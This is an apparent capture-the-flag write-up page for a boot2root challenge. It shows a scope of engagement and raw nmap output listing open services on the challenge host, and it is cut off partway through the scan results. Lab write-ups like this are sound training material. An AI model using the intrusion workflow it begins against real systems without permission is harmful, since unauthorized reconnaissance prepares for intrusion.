@@ -1,0 +1,1326 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Writeup for urchinsec 2024 boot2root challenge This is the writeup for the boot 2 root challenge Bill Systems which i got the second solve.
+This challneg requires knowledge in:
+recon persistense lateral movement priviledge escalation Bill Systems categoty: boot2root difficulty: medium
+we are given:
+1 2 3 SCOPE OF ENGAGEMENT domains : *.billsys.urc IP : 45.79.66.97 First we need to gather more info, so i ran an nmap scan to see open ports'>
+<title>Urchinsec_2024</title>
+
+<link rel='canonical' href='https://f0rk3b0mb.github.io/p/urchinsec_2024/'>
+
+<link rel="stylesheet" href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css"><meta property='og:title' content='Urchinsec_2024'>
+<meta property='og:description' content='Writeup for urchinsec 2024 boot2root challenge This is the writeup for the boot 2 root challenge Bill Systems which i got the second solve.
+This challneg requires knowledge in:
+recon persistense lateral movement priviledge escalation Bill Systems categoty: boot2root difficulty: medium
+we are given:
+1 2 3 SCOPE OF ENGAGEMENT domains : *.billsys.urc IP : 45.79.66.97 First we need to gather more info, so i ran an nmap scan to see open ports'>
+<meta property='og:url' content='https://f0rk3b0mb.github.io/p/urchinsec_2024/'>
+<meta property='og:site_name' content='f0rk3b0mb'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2024-04-28T18:07:14&#43;03:00'/><meta property='article:modified_time' content='2024-04-28T18:07:14&#43;03:00'/><meta property='og:image' content='https://f0rk3b0mb.github.io/cover/urchinsec.png' />
+<meta name="twitter:site" content="@f0rk3b0mb">
+    <meta name="twitter:creator" content="@f0rk3b0mb"><meta name="twitter:title" content="Urchinsec_2024">
+<meta name="twitter:description" content="Writeup for urchinsec 2024 boot2root challenge This is the writeup for the boot 2 root challenge Bill Systems which i got the second solve.
+This challneg requires knowledge in:
+recon persistense lateral movement priviledge escalation Bill Systems categoty: boot2root difficulty: medium
+we are given:
+1 2 3 SCOPE OF ENGAGEMENT domains : *.billsys.urc IP : 45.79.66.97 First we need to gather more info, so i ran an nmap scan to see open ports"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://f0rk3b0mb.github.io/cover/urchinsec.png' />
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-45FL0WGH80"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-45FL0WGH80', { 'anonymize_ip': false });
+}
+</script>
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "dark");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/profile_huf077503059140d44e06db4f515bdfac7_70175_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😎</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">f0rk3b0mb</a></h1>
+            <h2 class="site-description">Ctf player p3rf3ctr00t_ke | Cybersecurity | Infosec | web_security_analyst</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://discordapp.com/users/888054460956422195'
+                        target="_blank"
+                        title="discord"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0" encoding="UTF-8"?>
+<!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
+<svg width="800px" height="800px" viewBox="0 -28.5 256 256" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid">
+    <g>
+        <path d="M216.856339,16.5966031 C200.285002,8.84328665 182.566144,3.2084988 164.041564,0 C161.766523,4.11318106 159.108624,9.64549908 157.276099,14.0464379 C137.583995,11.0849896 118.072967,11.0849896 98.7430163,14.0464379 C96.9108417,9.64549908 94.1925838,4.11318106 91.8971895,0 C73.3526068,3.2084988 55.6133949,8.86399117 39.0420583,16.6376612 C5.61752293,67.146514 -3.4433191,116.400813 1.08711069,164.955721 C23.2560196,181.510915 44.7403634,191.567697 65.8621325,198.148576 C71.0772151,190.971126 75.7283628,183.341335 79.7352139,175.300261 C72.104019,172.400575 64.7949724,168.822202 57.8887866,164.667963 C59.7209612,163.310589 61.5131304,161.891452 63.2445898,160.431257 C105.36741,180.133187 151.134928,180.133187 192.754523,160.431257 C194.506336,161.891452 196.298154,163.310589 198.110326,164.667963 C191.183787,168.842556 183.854737,172.420929 176.223542,175.320965 C180.230393,183.341335 184.861538,190.991831 190.096624,198.16893 C211.238746,191.588051 232.743023,181.531619 254.911949,164.955721 C260.227747,108.668201 245.831087,59.8662432 216.856339,16.5966031 Z M85.4738752,135.09489 C72.8290281,135.09489 62.4592217,123.290155 62.4592217,108.914901 C62.4592217,94.5396472 72.607595,82.7145587 85.4738752,82.7145587 C98.3405064,82.7145587 108.709962,94.5189427 108.488529,108.914901 C108.508531,123.290155 98.3405064,135.09489 85.4738752,135.09489 Z M170.525237,135.09489 C157.88039,135.09489 147.510584,123.290155 147.510584,108.914901 C147.510584,94.5396472 157.658606,82.7145587 170.525237,82.7145587 C183.391518,82.7145587 193.761324,94.5189427 193.539891,108.914901 C193.539891,123.290155 183.391518,135.09489 170.525237,135.09489 Z" fill="#5865F2" fill-rule="nonzero">
+</path>
+    </g>
+</svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/f0rk3b0mb'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://ke.linkedin.com/in/abel-biketi-261212257'
+                        target="_blank"
+                        title="linkedin"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
+<svg width="800px" height="800px" viewBox="0 -2 44 44" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+    
+    <title>LinkedIn-color</title>
+    <desc>Created with Sketch.</desc>
+    <defs>
+
+</defs>
+    <g id="Icons" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <g id="Color-" transform="translate(-702.000000, -265.000000)" fill="#007EBB">
+            <path d="M746,305 L736.2754,305 L736.2754,290.9384 C736.2754,287.257796 734.754233,284.74515 731.409219,284.74515 C728.850659,284.74515 727.427799,286.440738 726.765522,288.074854 C726.517168,288.661395 726.555974,289.478453 726.555974,290.295511 L726.555974,305 L716.921919,305 C716.921919,305 717.046096,280.091247 716.921919,277.827047 L726.555974,277.827047 L726.555974,282.091631 C727.125118,280.226996 730.203669,277.565794 735.116416,277.565794 C741.21143,277.565794 746,281.474355 746,289.890824 L746,305 L746,305 Z M707.17921,274.428187 L707.117121,274.428187 C704.0127,274.428187 702,272.350964 702,269.717936 C702,267.033681 704.072201,265 707.238711,265 C710.402634,265 712.348071,267.028559 712.41016,269.710252 C712.41016,272.34328 710.402634,274.428187 707.17921,274.428187 L707.17921,274.428187 L707.17921,274.428187 Z M703.109831,277.827047 L711.685795,277.827047 L711.685795,305 L703.109831,305 L703.109831,277.827047 L703.109831,277.827047 Z" id="LinkedIn">
+
+</path>
+        </g>
+    </g>
+</svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/f0rk3b0mb'
+                        target="_blank"
+                        title="twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/posts' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="5" cy="19" r="1" />
+  <path d="M4 4a16 16 0 0 1 16 16" />
+  <path d="M4 11a9 9 0 0 1 9 9" />
+</svg>
+
+
+
+                
+                <span>posts</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about' target="_blank">
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>about</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#writeup-for-urchinsec-2024-boot2root-challenge">Writeup for urchinsec 2024 boot2root challenge</a>
+      <ol>
+        <li><a href="#bill-systems">Bill Systems</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/urchinsec_2024/">
+                
+                    <img src="/cover/urchinsec.png" loading="lazy" alt="Featured image of post Urchinsec_2024" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/writeups/" style="background-color: #2a9d8f; color: #fff;">
+                ctf writeups
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/urchinsec_2024/">Urchinsec_2024</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Apr 28, 2024</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    7 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="writeup-for-urchinsec-2024-boot2root-challenge">Writeup for urchinsec 2024 boot2root challenge</h2>
+<p>This is the writeup for the boot 2 root challenge Bill Systems  which i got the second solve.</p>
+<p>This challneg requires knowledge in:</p>
+<ul>
+<li>recon</li>
+<li>persistense</li>
+<li>lateral movement</li>
+<li>priviledge escalation</li>
+</ul>
+<hr>
+<h3 id="bill-systems">Bill Systems</h3>
+<p>categoty: boot2root
+difficulty: medium</p>
+<p>we are given:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SCOPE OF ENGAGEMENT
+</span></span><span class="line"><span class="cl">domains : *.billsys.urc
+</span></span><span class="line"><span class="cl">IP : 45.79.66.97
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>First we need to gather more info, so i ran an nmap scan to see open ports</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PORT     STATE    SERVICE     VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open     ssh         OpenSSH 9.7 (protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   256 9e:cd:9e:38:58:35:4c:24:1a:01:29:0d:9d:26:fe:2b (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 50:35:25:83:7d:aa:d7:42:43:d4:bb:fa:e8:6c:12:bb (ED25519)
+</span></span><span class="line"><span class="cl">25/tcp   filtered smtp
+</span></span><span class="line"><span class="cl">80/tcp   open     http
+</span></span><span class="line"><span class="cl">|_http-title: Site doesn&#39;t have a title (text/plain; charset=utf-8).
+</span></span><span class="line"><span class="cl">| fingerprint-strings: 
+</span></span><span class="line"><span class="cl">|   FourOhFourRequest: 
+</span></span><span class="line"><span class="cl">|     HTTP/1.0 200 OK
+</span></span><span class="line"><span class="cl">|     Date: Sat, 27 Apr 2024 12:15:19 GMT
+</span></span><span class="line"><span class="cl">|     Content-Length: 0
+</span></span><span class="line"><span class="cl">|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+</span></span><span class="line"><span class="cl">|     HTTP/1.1 400 Bad Request
+</span></span><span class="line"><span class="cl">|     Content-Type: text/plain; charset=utf-8
+</span></span><span class="line"><span class="cl">|     Connection: close
+</span></span><span class="line"><span class="cl">|     Request
+</span></span><span class="line"><span class="cl">|   GetRequest: 
+</span></span><span class="line"><span class="cl">|     HTTP/1.0 200 OK
+</span></span><span class="line"><span class="cl">|     Date: Sat, 27 Apr 2024 12:15:12 GMT
+</span></span><span class="line"><span class="cl">|     Content-Length: 0
+</span></span><span class="line"><span class="cl">|   HTTPOptions: 
+</span></span><span class="line"><span class="cl">|     HTTP/1.0 200 OK
+</span></span><span class="line"><span class="cl">|     Date: Sat, 27 Apr 2024 12:15:13 GMT
+</span></span><span class="line"><span class="cl">|_    Content-Length: 0
+</span></span><span class="line"><span class="cl">443/tcp  open     https?
+</span></span><span class="line"><span class="cl">3000/tcp open     ppp?
+</span></span><span class="line"><span class="cl">| fingerprint-strings: 
+</span></span><span class="line"><span class="cl">|   GenericLines, Help, RTSPRequest: 
+</span></span><span class="line"><span class="cl">|     HTTP/1.1 400 Bad Request
+</span></span><span class="line"><span class="cl">|     Content-Type: text/plain; charset=utf-8
+</span></span><span class="line"><span class="cl">|     Connection: close
+</span></span><span class="line"><span class="cl">|     Request
+</span></span><span class="line"><span class="cl">|   GetRequest: 
+</span></span><span class="line"><span class="cl">|     HTTP/1.0 200 OK
+</span></span><span class="line"><span class="cl">|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+</span></span><span class="line"><span class="cl">|     Content-Type: text/html; charset=utf-8
+</span></span><span class="line"><span class="cl">|     Set-Cookie: i_like_gitea=7748aed9b1afa3fe; Path=/; HttpOnly; SameSite=Lax
+</span></span><span class="line"><span class="cl">|     Set-Cookie: _csrf=U5NJcsVjX-xLNIhZ6o64wSWiZd86MTcxNDIyMDExMzY5MDg3MDY4Nw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+</span></span><span class="line"><span class="cl">|     X-Frame-Options: SAMEORIGIN
+</span></span><span class="line"><span class="cl">|     Date: Sat, 27 Apr 2024 12:15:13 GMT
+</span></span><span class="line"><span class="cl">|     &lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl">|     &lt;html lang=&#34;en-US&#34; data-theme=&#34;gitea-auto&#34;&gt;
+</span></span><span class="line"><span class="cl">|     &lt;head&gt;
+</span></span><span class="line"><span class="cl">|     &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt;
+</span></span><span class="line"><span class="cl">|     &lt;title&gt;Gitea: Git with a cup of tea&lt;/title&gt;
+</span></span><span class="line"><span class="cl">|     &lt;link rel=&#34;manifest&#34; href=&#34;data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2dpdC5iaWxsc3lzLnVyYy8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdC5iaWxsc3lzLnVyYy9hc3NldHMvaW1nL2xvZ28ucG5nIiwidHlwZSI6ImltYWdlL3BuZyIsInNpem
+</span></span><span class="line"><span class="cl">|   HTTPOptions: 
+</span></span><span class="line"><span class="cl">|     HTTP/1.0 405 Method Not Allowed
+</span></span><span class="line"><span class="cl">|     Allow: HEAD
+</span></span><span class="line"><span class="cl">|     Allow: GET
+</span></span><span class="line"><span class="cl">|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+</span></span><span class="line"><span class="cl">|     Set-Cookie: i_like_gitea=e41496a78b8b88ad; Path=/; HttpOnly; SameSite=Lax
+</span></span><span class="line"><span class="cl">|     Set-Cookie: _csrf=vUtLqCC5_VSGwBmhopYmXC6PyWM6MTcxNDIyMDEyMDUyMzg0MjU2Mw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+</span></span><span class="line"><span class="cl">|     X-Frame-Options: SAMEORIGIN
+</span></span><span class="line"><span class="cl">|     Date: Sat, 27 Apr 2024 12:15:20 GMT
+</span></span><span class="line"><span class="cl">|_    Content-Length: 0
+</span></span><span class="line"><span class="cl">3306/tcp open     mysql       MariaDB (unauthorized)
+</span></span><span class="line"><span class="cl">3333/tcp open     nagios-nsca Nagios NSCA
+</span></span><span class="line"><span class="cl">2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class="line"><span class="cl">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+</span></span><span class="line"><span class="cl">SF-Port80-TCP:V=7.94SVN%I=7%D=4/27%Time=662CEC50%P=x86_64-pc-linux-gnu%r(G
+</span></span><span class="line"><span class="cl">SF:etRequest,4B,&#34;HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2027\x20Apr\x202
+</span></span><span class="line"><span class="cl">SF:024\x2012:15:12\x20GMT\r\nContent-Length:\x200\r\n\r\n&#34;)%r(HTTPOptions,
+</span></span><span class="line"><span class="cl">SF:4B,&#34;HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2027\x20Apr\x202024\x2012:
+</span></span><span class="line"><span class="cl">SF:15:13\x20GMT\r\nContent-Length:\x200\r\n\r\n&#34;)%r(RTSPRequest,67,&#34;HTTP/1
+</span></span><span class="line"><span class="cl">SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
+</span></span><span class="line"><span class="cl">SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&#34;)%r(FourOhF
+</span></span><span class="line"><span class="cl">SF:ourRequest,4B,&#34;HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2027\x20Apr\x20
+</span></span><span class="line"><span class="cl">SF:2024\x2012:15:19\x20GMT\r\nContent-Length:\x200\r\n\r\n&#34;)%r(GenericLine
+</span></span><span class="line"><span class="cl">SF:s,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain
+</span></span><span class="line"><span class="cl">SF:;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request
